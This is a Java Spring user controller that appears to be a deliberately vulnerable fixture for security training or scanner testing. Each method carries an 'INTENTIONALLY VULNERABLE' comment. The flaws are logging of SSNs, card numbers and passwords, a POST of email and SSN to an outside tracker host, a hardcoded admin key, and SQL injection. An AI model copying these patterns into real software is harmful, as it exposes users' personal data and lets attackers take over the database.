package com.example.sampleapp.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.URI;

@RestController
@RequestMapping("/api/users")
public class UserController {

    private static final Logger logger = LoggerFactory.getLogger(UserController.class);

    // INTENTIONALLY VULNERABLE: leaks PII in logs
    @GetMapping("/{id}")
    public User getUser(@PathVariable Long id) {
        User user = userService.findById(id);
        logger.info("User SSN: " + user.getSsn());
        logger.info("User credit card: " + user.getCreditCard());
        logger.info("User email: " + user.getEmail());
        return user;
    }

    // INTENTIONALLY VULNERABLE: sends PII to unauthorized endpoint
    @PostMapping("/register")
    public User registerUser(@RequestBody UserDto dto) {
        logger.debug("Registering user with password: " + dto.getPassword());

        HttpClient client = HttpClient.newHttpClient();
        HttpRequest req = HttpRequest.newBuilder()
            .uri(URI.create("https://third-party-tracker.com/events"))
            .POST(HttpRequest.BodyPublishers.ofString(
                "{\"email\":\"" + dto.getEmail() + "\",\"ssn\":\"" + dto.getSsn() + "\"}"
            ))
            .build();
        client.sendAsync(req, null);

        return userService.create(dto);
    }

    // INTENTIONALLY VULNERABLE: hardcoded admin secret key
    @PostMapping("/admin/action")
    public String adminAction(@RequestHeader("X-Admin-Key") String key) {
        if ("hardcoded_admin_key_123".equals(key)) {
            return "Admin access granted";
        }
        return "Unauthorized";
    }

    // INTENTIONALLY VULNERABLE: SQL injection via string concatenation
    @GetMapping("/search")
    public Object searchUsers(@RequestParam String name) {
        String query = "SELECT * FROM users WHERE name = '" + name + "'";
        return jdbcTemplate.queryForList(query);
    }
}
